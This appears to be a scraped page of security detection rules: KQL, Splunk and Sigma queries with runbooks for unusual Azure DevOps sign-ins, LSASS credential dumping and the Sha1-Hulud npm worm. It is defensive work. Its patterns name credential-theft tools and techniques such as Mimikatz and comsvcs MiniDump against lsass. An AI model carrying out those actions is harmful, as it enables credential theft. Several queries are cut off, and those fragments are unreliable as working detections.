  • Approved third-party integrations/OAuth apps authenticating to Azure DevOps from a cloud provider ASN
Suppression filter
| where IsAnonymousProxy == true or RiskLevelDuringSignIn in ("high","medium")   // Defender: prioritise anonymised/risky origins over routine travel
Response runbook
1) Triage: verify with the user (or their manager) whether the new country/ASN is expected travel; check the same session for MFA satisfaction, RiskLevelDuringSignIn, and IsAnonymousProxy. 2) Contain: if unverified, revoke the user's refresh tokens and Azure DevOps PATs, force password reset + re-MFA, and apply a conditional-access location restriction to the Azure DevOps app. 3) Hunt: correlate this identity with bulk repo clone (UC above) and storage-key listing in the same window; enumerate PATs the account created and repos it accessed to scope exposure.
let lookback = 14d;
let recent = 1d;
let Baseline = AADSignInEventsBeta
| where Timestamp between (ago(lookback) .. ago(recent))
| where ResourceDisplayName has "DevOps"
| summarize by AccountUpn, Country;
AADSignInEventsBeta
| where Timestamp > ago(recent)
| where ResourceDisplayName has "DevOps"
| where ErrorCode == 0
| join kind=leftanti Baseline on AccountUpn, Country
| project Timestamp, AccountUpn, IPAddress, Country, City, Application, ResourceDisplayName, ClientAppUsed, IsAnonymousProxy
| order by Timestamp desc
let lookback = 14d;
let recent = 1d;
let Baseline = SigninLogs
| where TimeGenerated between (ago(lookback) .. ago(recent))
| where ResourceDisplayName has "DevOps"
| where ResultType == 0
| summarize by UserPrincipalName, AutonomousSystemNumber;
SigninLogs
| where TimeGenerated > ago(recent)
| where ResourceDisplayName has "DevOps"
| where ResultType == 0
| join kind=leftanti Baseline on UserPrincipalName, AutonomousSystemNumber
| extend Country = tostring(parse_json(tostring(LocationDetails)).countryOrRegion)
| project TimeGenerated, UserPrincipalName, IPAddress, AutonomousSystemNumber, Country, AppDisplayName, ResourceDisplayName, ClientAppUsed, RiskLevelDuringSignIn
| order by TimeGenerated desc
source:azure.activeDirectory @evt.name:"Sign-in activity" @properties.appDisplayName:(*DevOps* OR *devops*)

| tstats summariesonly=false count as auths, values(Authentication.src) as src_ips, min(_time) as firstSeen, max(_time) as lastSeen from datamodel=Authentication.Authentication where Authentication.action=success Authentication.app="Azure DevOps" by Authentication.user, Authentication.src | `drop_dm_object_name(Authentication)` | sort - firstSeen

Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486

DeviceFileEvents

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |
    Anything opening lsass.exe with read-memory access that isn't a
    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Clankerusecase
date: 2026/05/02

    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\SearchProtocolHost.exe'

falsepositives:

level: high

Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes

        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

Sha1-Hulud 2.0 npm worm payload files (setup_bun.js / bun_environment.js) written or executed AIInstallation Medium
Hunts for the hardcoded self-propagating payload files the Sha1-Hulud/Megalodon npm worm drops during a malicious package preinstall, matched by exact filename and known SHA256. The article cites Sha1-Hulud dumping harvested credentials into public GitHub repos as the exfiltration destination it warns about; this catches the worm at the execution stage before that exfil happens. Rationale: Uses the exact worm payload filenames (setup_bun.js, bun_environment.js) and four published SHA256 hashes from Datadog/Microsoft analyses of Sha1-Hulud 2.0 — the campaign the article names as the archetype of GitHub-hosted secret exfiltration. Filename+hash makes this alerting-grade. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/ • https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher intentionally detonating a captured Sha1-Hulud sample in a sandbox VONM
  • Threat-intel/malware-repo mirror syncing sample files to a scanning host
  • EDR test/purple-team exercise seeding the named hashes
  • A benign project legitimately shipping a file literally named setup_bun.js (rare; hash filter avoids this)
Suppression filter
| where not (InitiatingProcessFileName in~ ("MsSense.exe","MsMpEng.exe") or FolderPath has_any ("\\MalwareSamples\\","\\Quarantine\\"))
Response runbook
Step 1 (triage): Confirm the SHA256 matches a known worm hash and identify the InitiatingProcess (should be node/npm/bun preinstall). Pull the parent package name and package.json to find the poisoned dependency. Step 2 (contain): Isolate the host/runner, revoke any npm/GitHub/cloud tokens present on it, and freeze the developer's npm publish rights. Step 3 (hunt): Search the org for the same hashes and for any public GitHub repos with description 'Sha1-Hulud: The Second Coming.'; rotate every secret reachable from the affected build.

| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
